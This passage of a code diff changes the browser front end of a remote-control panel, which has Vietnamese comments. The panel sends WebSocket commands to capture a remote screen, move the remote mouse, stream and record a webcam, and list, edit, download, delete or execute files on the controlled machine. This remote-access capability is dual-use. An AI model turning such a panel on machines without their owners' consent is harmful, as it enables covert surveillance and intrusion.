-        const x = (e.clientX - rect.left) / rect.width;
-        const y = (e.clientY - rect.top) / rect.height;
-        
-        let btn = 'left';
-        if(e.button===1) btn='middle'; 
-        if(e.button===2) btn='right';
-
-        if(x>=0 && x<=1 && y>=0 && y<=1) {
-            send('INPUT', cmd, {x, y, btn, type});
-        }
-    }
-
-    // --- EXPLORER LOGIC ---
-    function renderExplorer(res) {
-        currentPath = res.current_path;
-        renderBreadcrumbs(currentPath);
-        
-        const grid = document.getElementById('file-grid');
-        grid.innerHTML = "";
-        
-        const list = res.data.sort((a,b) => (a.type==='drive'?0:a.type==='dir'?1:2) - (b.type==='drive'?0:b.type==='dir'?1:2));
-
-        list.forEach(f => {
-            const div = document.createElement('div');
-            div.className = 'file-item';
-            let icon = f.type==='drive'?'💽': f.type==='dir'?'📁': f.type==='image'?'🖼️': '📄';
-            div.innerHTML = `<div class="file-icon">${icon}</div><div class="file-name">${f.name}</div>`;
-            
-            div.onclick = () => {
-                if(f.type==='dir'||f.type==='drive') send('FILE','LIST_DIR',{path:f.path});
-                else { selectedFile=f; ctxSmartOpen(); }
-            };
-            div.oncontextmenu = (e) => {
-                e.preventDefault(); selectedFile=f;
-                const menu = document.getElementById('context-menu');
-                menu.style.display='block'; menu.style.left=e.clientX+'px'; menu.style.top=e.clientY+'px';
-            };
-            grid.appendChild(div);
-        });
-    }
-
-    function renderBreadcrumbs(path) {
-        const b = document.getElementById('breadcrumbs');
-        if(!path) { b.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">MY COMPUTER</span>"; return; }
-        
-        b.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">PC</span>";
-        const parts = path.split(/[\\/]/).filter(p=>p);
-        let build = "";
-        parts.forEach(p => {
-            build += (build==="" && p.includes(':') ? p+"\\" : (build===""?p:"\\"+p));
-            b.innerHTML += ` <span style="color:#555">></span> <span class='crumb' onclick="send('FILE','LIST_DIR',{path:'${build.replace(/\\/g,'\\\\')}'})">${p}</span>`;
-        });
-    }
-
-    function ctxSmartOpen() {
-        document.getElementById('context-menu').style.display='none';
-        if(!selectedFile) return;
-        if(isTextFile(selectedFile.name)) send('FILE','READ_TEXT',{path:selectedFile.path});
-        else if(confirm("Run/Execute "+selectedFile.name+" on Server?")) send('FILE','EXECUTE',{path:selectedFile.path});
-    }
-    function ctxDownload() {
-        document.getElementById('context-menu').style.display='none';
-        selectedFile.downloading = true;
-        send('FILE','GET',{name:selectedFile.path});
-    }
-    function ctxDelete() {
-        document.getElementById('context-menu').style.display='none';
-        if(confirm("Delete "+selectedFile.name+"?")) send('FILE','DELETE',{path:selectedFile.path});
-    }
-    
-    // --- EDITOR ---
-    function openEditor(res) {
-        document.getElementById('editor-modal').style.display='flex';
-        document.getElementById('editor-text').value = res.content;
-        document.getElementById('editor-title').innerText = "EDIT: " + res.path;
-        selectedFile = { path: res.path };
-    }
-    function saveFile() {
-        send('FILE','WRITE_TEXT',{path:selectedFile.path, content:document.getElementById('editor-text').value});
-    }
-    function closeEditor() { document.getElementById('editor-modal').style.display='none'; }
-
-    // --- GALLERY & TABS ---
-    function renderGallery(data) {
-        const list = document.getElementById('file-list-box'); list.innerHTML = "";
-        data.reverse().forEach(f => {
-            const div = document.createElement('div');
-            div.style.padding="8px"; div.style.borderBottom="1px solid #222"; div.style.cursor="pointer";
-            div.style.fontSize="11px"; div.style.display="flex"; div.style.justifyContent="space-between";
-            div.innerHTML = `<span>${f.name}</span> <span style="color:#666">${(f.size/1024).toFixed(1)} KB</span>`;
-            
-            div.onclick = () => {
-                document.getElementById('main-view').classList.add('hidden');
-                document.getElementById('video-player').classList.add('hidden');
-                
-                if(f.name.endsWith('.webm') || f.name.endsWith('.mp4')) {
-                    // FIX VIDEO PLAYBACK
-                    const v = document.getElementById('video-player');
-                    v.classList.remove('hidden');
-                    // Gắn cờ để handleMessage biết đây là video data
-                    selectedFile = { name: f.name, playingVideo: true };
-                    send('FILE','GET',{name:f.name});
-                } else {
-                    const i = document.getElementById('main-view'); i.classList.remove('hidden');
-                    // Ảnh thì tải như bình thường
-                    ws.onmessage = (e) => { 
-                        if (e.data instanceof ArrayBuffer) {
-                            i.src = URL.createObjectURL(new Blob([e.data])); 
-                            ws.onmessage = handleMessage; 
-                        }
-                    };
-                    send('FILE','GET',{name:f.name});
+            send('SCREEN','CAPTURE_BINARY',{save:false});
+            img.onmousemove = e => {
+                if (Date.now() - lastMouseSend < 40) return;
+                lastMouseSend = Date.now();
+                const r = img.getBoundingClientRect();
+                const x = (e.clientX - r.left) / r.width;
+                const y = (e.clientY - r.top) / r.height;
+                if (x >=0 && x <=1 && y >=0 && y <=1) {
+                    send('INPUT', 'MOUSE_MOVE', {x, y});
                 }
             };
-            list.appendChild(div);
-        });
-    }
-
-    function switchTab(t) {
-        document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
-        document.querySelector(`button[onclick="switchTab('${t}')"]`).classList.add('active');
-        ['tab-control','tab-explorer','tab-gallery'].forEach(id=>document.getElementById(id).classList.add('hidden'));
-        ['explorer-view','media-view'].forEach(id=>document.getElementById(id).classList.add('hidden'));
-
-        document.getElementById('tab-'+t).classList.remove('hidden');
-        if(t==='explorer') {
-            document.getElementById('explorer-view').classList.remove('hidden');
-            send('FILE','LIST_DIR',{path:currentPath});
+            img.onmousedown = e => send('INPUT','MOUSE_BTN',{x:0,y:0,btn:e.button===0?'left':e.button===2?'right':'middle',type:'down'});
+            img.onmouseup = e => send('INPUT','MOUSE_BTN',{x:0,y:0,btn:e.button===0?'left':e.button===2?'right':'middle',type:'up'});
         } else {
-            document.getElementById('media-view').classList.remove('hidden');
-            if(t==='gallery') send('FILE','LIST');
-        }
-        
-        // Reset player if leaving gallery
-        if(t!=='gallery') { 
-            document.getElementById('video-player').classList.add('hidden'); 
-            document.getElementById('main-view').classList.remove('hidden');
-            // Dừng stream webcam nếu đang chạy để tiết kiệm
-            if(isRecording) stopWebcam();
+            btn.textContent = "START REMOTE CONTROL";
+            btn.style.background = '';
+            img.style.cursor = 'default';
+            isStreaming = false;
+            img.onmousemove = img.onmousedown = img.onmouseup = null;
         }
     }
 
-    // --- OTHER ---
-    function takeScreenshot() { switchTab('control'); send('SCREEN','CAPTURE_BINARY',{save:true}); }
-    function refresh() { send('FILE','LIST_DIR',{path:currentPath}); }
+    function takeScreenshot() { 
+        send('SCREEN','CAPTURE_BINARY',{save:true}); 
+        switchTab('control'); 
+    }
     
-    // Webcam Rec
     function startWebcam() { 
         send('WEBCAM','START_STREAM'); 
-        isRecording=true; recordedChunks=[];
-        // 25 FPS Stream Record
-        mediaRecorder = new MediaRecorder(canvas.captureStream(25));
-        mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
-        mediaRecorder.onstop = () => {
-            const blob = new Blob(recordedChunks, {type:'video/webm'});
-            const reader = new FileReader();
-            reader.readAsDataURL(blob);
-            reader.onloadend = () => {
-                const b64 = reader.result.split(',')[1];
-                send('FILE','SAVE_VIDEO',{name:`cam_${Date.now()}.webm`, data:b64});
-            };
-        };
-        mediaRecorder.start();
-        document.getElementById('view-label').innerText = "🔴 RECORDING WEBCAM...";
     }
+    
     function stopWebcam() { 
         send('WEBCAM','STOP_STREAM'); 
-        if(isRecording && mediaRecorder) { mediaRecorder.stop(); isRecording=false; }
-        document.getElementById('view-label').innerText = "IDLE";
     }
-
-    document.onclick = () => document.getElementById('context-menu').style.display='none';
 </script>
 </body>
 </html>
